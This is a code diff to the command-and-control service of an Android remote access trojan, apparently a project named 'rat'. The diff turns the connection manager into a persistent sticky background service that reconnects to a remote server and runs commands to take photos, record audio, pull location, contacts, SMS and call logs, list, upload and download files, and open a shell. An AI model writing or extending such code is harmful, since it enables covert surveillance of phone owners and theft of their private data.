@@ -1,6 +1,9 @@
 package com.fly0rakoon.rat.services;
 
+import android.app.Service;
 import android.content.Context;
+import android.content.Intent;
+import android.os.IBinder;
 import android.util.Log;
 
 import com.fly0rakoon.rat.modules.*;
@@ -16,7 +19,7 @@ import java.net.InetSocketAddress;
 import java.net.Socket;
 import java.net.SocketTimeoutException;
 
-public class ConnectionManager {
+public class ConnectionManager extends Service {
     
     private static final String TAG = "ConnectionManager";
     
@@ -37,12 +40,54 @@ public class ConnectionManager {
     private ContactsModule contactsModule;
     private FileModule fileModule;
     
-    public ConnectionManager(Context context) {
-        this.context = context;
+    // Default constructor required for Service
+    public ConnectionManager() {
+        super();
+    }
+    
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        Log.d(TAG, "ConnectionManager service created");
+        this.context = this;
         initializeModules();
+        start();
+    }
+    
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        Log.d(TAG, "ConnectionManager onStartCommand");
+        if (context == null) {
+            context = this;
+        }
+        if (cameraModule == null) {
+            initializeModules();
+        }
+        if (!isRunning) {
+            start();
+        }
+        return START_STICKY; // Keep service running
+    }
+    
+    @Override
+    public void onDestroy() {
+        Log.d(TAG, "ConnectionManager onDestroy");
+        super.onDestroy();
+        stop();
+    }
+    
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null; // Not a bound service
     }
     
     private void initializeModules() {
+        if (context == null) {
+            Log.e(TAG, "Context is null, cannot initialize modules");
+            return;
+        }
+        
+        Log.d(TAG, "Initializing modules");
         cameraModule = new CameraModule(context);
         micModule = new MicModule(context);
         locationModule = new LocationModule(context);
@@ -53,8 +98,12 @@ public class ConnectionManager {
     }
     
     public void start() {
-        if (isRunning) return;
+        if (isRunning) {
+            Log.d(TAG, "Already running");
+            return;
+        }
         
+        Log.d(TAG, "Starting ConnectionManager");
         isRunning = true;
         connectionThread = new Thread(new Runnable() {
             @Override
@@ -70,6 +119,7 @@ public class ConnectionManager {
                     try {
                         Thread.sleep(Constants.RECONNECT_DELAY);
                     } catch (InterruptedException e) {
+                        Log.d(TAG, "Reconnect delay interrupted");
                         break;
                     }
                 }
@@ -105,6 +155,7 @@ public class ConnectionManager {
             // Listen for commands
             String command;
             while (isRunning && isConnected && (command = in.readLine()) != null) {
+                Log.d(TAG, "Received command: " + command);
                 processCommand(command);
             }
             
@@ -119,8 +170,6 @@ public class ConnectionManager {
     }
     
     private void processCommand(String command) {
-        Log.d(TAG, "Received command: " + command);
-        
         if (command == null || command.isEmpty()) return;
         
         String response;
@@ -138,39 +187,39 @@ public class ConnectionManager {
                 break;
                 
             case Constants.CMD_LOCATION:
-                response = locationModule.getLocation();
+                response = locationModule != null ? locationModule.getLocation() : "Location module not initialized";
                 break;
                 
             case Constants.CMD_CONTACTS:
-                response = contactsModule.getContacts();
+                response = contactsModule != null ? contactsModule.getContacts() : "Contacts module not initialized";
                 break;
                 
             case Constants.CMD_SMS:
-                response = smsModule.handleCommand(args);
+                response = smsModule != null ? smsModule.handleCommand(args) : "SMS module not initialized";
                 break;
                 
             case Constants.CMD_CALLS:
-                response = callModule.getCallLogs();
+                response = callModule != null ? callModule.getCallLogs() : "Call module not initialized";
                 break;
                 
             case Constants.CMD_CAMERA:
-                response = cameraModule.takePhoto(args.equals("front") ? "front" : "back");
+                response = cameraModule != null ? cameraModule.takePhoto(args.equals("front") ? "front" : "back") : "Camera module not initialized";
                 break;
                 
             case Constants.CMD_CAMERA_FRONT:
-                response = cameraModule.takePhoto("front");
+                response = cameraModule != null ? cameraModule.takePhoto("front") : "Camera module not initialized";
                 break;
                 
             case Constants.CMD_CAMERA_BACK:
-                response = cameraModule.takePhoto("back");
+                response = cameraModule != null ? cameraModule.takePhoto("back") : "Camera module not initialized";
                 break;
                 
             case Constants.CMD_MIC:
-                response = micModule.startRecording();
+                response = micModule != null ? micModule.startRecording() : "Mic module not initialized";
                 break;
                 
             case Constants.CMD_MIC_STOP:
-                response = micModule.stopRecording();
+                response = micModule != null ? micModule.stopRecording() : "Mic module not initialized";
                 break;
                 
             case Constants.CMD_SCREENSHOT:
@@ -178,15 +227,15 @@ public class ConnectionManager {
                 break;
                 
             case Constants.CMD_FILES:
-                response = fileModule.listFiles(args);
+                response = fileModule != null ? fileModule.listFiles(args) : "File module not initialized";
                 break;
                 
             case Constants.CMD_DOWNLOAD:
-                response = fileModule.downloadFile(args);
+                response = fileModule != null ? fileModule.downloadFile(args) : "File module not initialized";
                 break;
                 
             case Constants.CMD_UPLOAD:
-                response = fileModule.uploadFile(args);
+                response = fileModule != null ? fileModule.uploadFile(args) : "File module not initialized";
                 break;
                 
             case Constants.CMD_SHELL:
@@ -255,22 +304,18 @@ public class ConnectionManager {
     }
     
     private String getBatteryInfo() {
-        // Simplified - you'll implement this
         return "Battery level: 85% (placeholder)";
     }
     
     private String getNetworkInfo() {
-        // Simplified - you'll implement this
         return "Network: Connected (placeholder)";
     }
     
     private String getInstalledApps() {
-        // Simplified - you'll implement this
         return "Installed apps list (placeholder)";
     }
     
     private String takeScreenshot() {
-        // Simplified - you'll implement this
         return "Screenshot saved: /sdcard/screenshot.png (placeholder)";
     }
     
@@ -339,6 +384,7 @@ public class ConnectionManager {
     }
     
     public void stop() {
+        Log.d(TAG, "Stopping ConnectionManager");
         isRunning = false;
         isConnected = false;
         closeConnection();
